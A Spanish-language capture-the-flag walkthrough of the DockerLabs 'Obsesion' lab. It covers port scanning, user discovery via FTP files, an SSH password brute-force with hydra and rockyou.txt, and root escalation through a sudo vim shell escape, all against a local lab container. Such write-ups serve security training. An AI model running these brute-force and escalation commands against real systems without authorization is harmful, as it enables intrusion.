## Introducción

Este documento presenta la resolución completa de la máquina **Obsesion**, desarrollada por *Juan* para la plataforma **DockerLabs**, clasificada con una dificultad **Muy Fácil**.
El laboratorio expone múltiples servicios, incluyendo FTP anónimo, SSH y HTTP. A través de la enumeración web se descubren directorios que contienen archivos descargables, mientras que el servicio FTP permite acceder a archivos de texto que revelan información sobre posibles usuarios del sistema.
Tras identificar al usuario `russoski` como válido, se realiza un ataque de fuerza bruta contra el servicio SSH para obtener acceso al sistema. Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `vim` como root, facilitando una escalada de privilegios inmediata hasta obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Obsesion.zip
sudo bash auto_deplo.sh Obsesion.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748329772/ipScan_ifwllz.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Obsesion/{content,exploits,nmap,scripts}
cd Obsesion
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **21/tcp** — FTP
* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1748330454/Ports_hbflkv.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p21,22,80 172.17.0.2 -oN targeted
```

## Paso 2 — Explotación (Acceso inicial)

Entre los archivos encontrados se encuentran referencias a posibles usuarios. Analizando los textos, se deduce que `russoski` es un usuario válido del sistema.

Se realiza un ataque de fuerza bruta contra el servicio SSH utilizando el diccionario `rockyou.txt`:

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

Hydra encuentra las credenciales correctas, lo que permite acceder al sistema mediante SSH:

```bash
ssh russoski@172.17.0.2
```

![Login](https://res.cloudinary.com/dewqswzke/image/upload/v1748330452/Login_wdvimh.png)

## Paso 3 — Escalada de privilegios

### 3.1 De russoski → root

Al acceder al sistema, se verifican los permisos sudo del usuario:

```bash
sudo -l
```

![Sudo](https://res.cloudinary.com/dewqswzke/image/upload/v1748330456/Sudo_r03bj0.png)

El usuario puede ejecutar `vim` como root sin necesidad de contraseña.

Se utiliza `searchbins` para verificar si existe una ruta en GTFOBins:

```bash
searchbins -b vim -f sudo
```

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
sudo vim -c ':! /bin/sh'
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1748330455/Root_mhcunf.png)
